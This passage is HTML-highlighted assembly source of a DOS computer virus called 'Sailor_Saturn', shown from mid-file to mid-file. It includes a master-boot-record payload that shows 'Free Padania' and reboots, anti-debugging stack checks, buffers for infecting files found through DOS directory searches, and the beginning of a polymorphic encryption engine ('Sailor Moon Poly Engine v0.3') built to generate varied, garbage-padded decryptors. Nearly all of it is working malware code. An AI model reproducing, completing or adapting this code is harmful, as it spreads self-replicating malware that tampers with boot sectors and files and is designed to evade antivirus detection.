                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; mem after ourselves</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">                   </span><span class="sc1">; read original MBR</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; from 0,0,4</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; reput original MBR on disk</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">
                                                </span><span class="sc1">; jump there will reboot and let</span><span class="sc0">
                                                </span><span class="sc1">; the user continue on it's way</span><span class="sc0">
                                                </span><span class="sc1">; after the reboot with the</span><span class="sc0">
                                                </span><span class="sc1">; clear idea that Padania</span><span class="sc0">
                                                </span><span class="sc1">; should be free!</span><span class="sc0">
</span><span class="sc5">disegno</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11101010b</span><span class="sc4">,</span><span class="sc2">10101010b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">10100001b</span><span class="sc4">,</span><span class="sc2">01010111b</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11100001b</span><span class="sc4">,</span><span class="sc2">01111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111110b</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11100001b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">00011111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">01000000b</span><span class="sc4">,</span><span class="sc2">00001010b</span><span class="sc4">,</span><span class="sc2">10101111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11100011b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11110100b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">10101111b</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11000111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">01010000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">10110000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11001111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111101b</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111101b</span><span class="sc4">,</span><span class="sc2">01010000b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">11111111b</span><span class="sc4">,</span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">string</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Free Padania'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">payload_mbr_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">payload_mbr_lenght</span><span class="sc4">=</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload_mbr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload_mbr</span><span class="sc0">

</span><span class="sc5">prefetch_jump</span><span class="sc4">:</span><span class="sc0">
                                                </span><span class="sc1">; check if possible</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'iH'</span><span class="sc0">                    </span><span class="sc1">; enemy around</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_stack</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_ss</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">original_cs</span><span class="sc4">)</span><span class="sc0">
                                                </span><span class="sc1">; if tracer cathed</span><span class="sc0">
                                                </span><span class="sc1">; on restoration SS:SP will</span><span class="sc0">
                                                </span><span class="sc1">; be equal to (CS+02h):IP</span><span class="sc0">
                                                </span><span class="sc1">; i hope he won't use the</span><span class="sc0">
                                                </span><span class="sc1">; stack ;)</span><span class="sc0">
</span><span class="sc5">ok_stack</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_there</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">spoly.asm</span><span class="sc0">                       </span><span class="sc1">; SMPE 0.3</span><span class="sc0">

</span><span class="sc5">saturn_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; End of Sailor_Saturn on disk</span><span class="sc0">

</span><span class="sc5">head_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1ch</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; buffer for infection</span><span class="sc0">

</span><span class="sc5">inflenght</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; lenght of infection for DTA</span><span class="sc0">
</span><span class="sc5">tmp_name</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; tmp space for first 2 fname chars</span><span class="sc0">
</span><span class="sc5">filenameoff</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; stuff for 4eh/4fh infection</span><span class="sc0">
</span><span class="sc5">filedotoff</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4ch</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">fast_infection</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 00h = Off, 01h = On</span><span class="sc0">
</span><span class="sc5">old_24h</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                   </span><span class="sc1">; int 24h seg:off</span><span class="sc0">

</span><span class="sc5">int21h_ss</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">int21h_sp</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">saturn_stack</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">800h</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">stack_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">saturn_mem_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; End of Sailor_Saturn in memory</span><span class="sc0">

</span><span class="sc5">saturn_size</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">saturn_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">saturn_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">poly_mem_used</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">saturn_mem_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">saturn_mem_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">saturn_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">saturn_mem_para</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">saturn_mem_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">saturn</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">saturn_start</span><span class="sc0">

</span><span class="sc4">[</span><span class="sc5">SPOLY.ASM</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sailor Moon Poly Engine v0.3</span><span class="sc0">
</span><span class="sc1">; in:</span><span class="sc0">
</span><span class="sc1">;    CX = bytes to encrypt</span><span class="sc0">
</span><span class="sc1">;    DS:DX = what we are going to encrypt (body of ourselves)</span><span class="sc0">
</span><span class="sc1">;    BP = offset at which it will run</span><span class="sc0">
</span><span class="sc1">;    AX = max number of garbage instructions to generate</span><span class="sc0">
</span><span class="sc1">; it is assumed that DS=CS !!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; out:</span><span class="sc0">
</span><span class="sc1">;    CX    = lenght of the generated code</span><span class="sc0">
</span><span class="sc1">;    DI    = offset at which enter to the poly (considering that the real</span><span class="sc0">
</span><span class="sc1">;            start is at SEG:0 but we want to make some garbage before the</span><span class="sc0">
</span><span class="sc1">;            real entrypoint)</span><span class="sc0">
</span><span class="sc1">;    ES:DX = generated code</span><span class="sc0">
</span><span class="sc1">;    BX    = preserved</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">poly_mem_used</span><span class="sc4">=(</span><span class="sc5">poly_data_mem_end</span><span class="sc4">-</span><span class="sc5">poly_data_mem</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">poly_paras</span><span class="sc4">=</span><span class="sc2">0a00h</span><span class="sc0">                   </span><span class="sc1">; temp memory for poly is 40kbs, a lot</span><span class="sc0">
                                   </span><span class="sc1">; more than enough, but to be sure</span><span class="sc0">

</span><span class="sc5">smpe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">gnum</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;; Try to allocate the needed memory for the poly stuff</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; allocate mem for our poly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">poly_paras</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_memory</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; no mem avaiable :(</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; allocated segment</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">; save important regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">;; Initialization start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_to_cx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">9090h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isword</span><span class="sc0">

</span><span class="sc1">; SI used for many mem references... ONLY in the main decryptor creation</span><span class="sc0">
</span><span class="sc1">; loop</span><span class="sc0">
</span><span class="sc1">;       points:</span><span class="sc0">
</span><span class="sc1">; -8    enc_lenght</span><span class="sc0">
</span><span class="sc1">; -6    last_done</span><span class="sc0">
</span><span class="sc1">; -5    reg8bits</span><span class="sc0">
</span><span class="sc1">; -4    pointer_di</span><span class="sc0">
</span><span class="sc1">; -2    secphs</span><span class="sc0">
</span><span class="sc1">; SI    isword</span><span class="sc0">
</span><span class="sc1">; +1    isrolror</span><span class="sc0">
</span><span class="sc1">; +2    push_nr</span><span class="sc0">
</span><span class="sc1">; +3    can_doda</span><span class="sc0">
</span><span class="sc1">; +4    count_reg</span><span class="sc0">
</span><span class="sc1">; +5    point_reg</span><span class="sc0">
</span><span class="sc1">; +6    nocx</span><span class="sc0">
</span><span class="sc1">; +7    seg_sta</span><span class="sc0">
</span><span class="sc1">; +8    emu_trick</span><span class="sc0">
</span><span class="sc1">; +9    inverse</span><span class="sc0">
</span><span class="sc1">; +A    cmp_check</span><span class="sc0">
</span><span class="sc1">; +B    cmp_check2</span><span class="sc0">
</span><span class="sc1">; +C    ds_mody</span><span class="sc0">
</span><span class="sc1">; +D    counter_pos</span><span class="sc0">
</span><span class="sc1">; +F    jz_nr</span><span class="sc0">
</span><span class="sc1">; +11   no_imm</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_ax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; save lenght</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc2">3480h</span><span class="sc0">    </span><span class="sc1">; engine initialization</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; clear type selection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; clear used registers</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">prefix_386</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; clear rnd values</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modify_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_inc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; clear increments</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; so ES:DI = ES:0</span><span class="sc0">

</span><span class="sc1">;; Initialization end</span><span class="sc0">


</span><span class="sc1">;; Decryption building start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; decryptor gen. start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
</span><span class="sc5">rndget</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; no sp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; no ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">rndget</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                         </span><span class="sc1">; mov _reg16_,immediate</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">on_one_side</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">on_one_side</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; 0-2 ROR, 3-7 MATH</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nororing</span><span class="sc0">                        </span><span class="sc1">; select if ror/rol of math</span><span class="sc0">

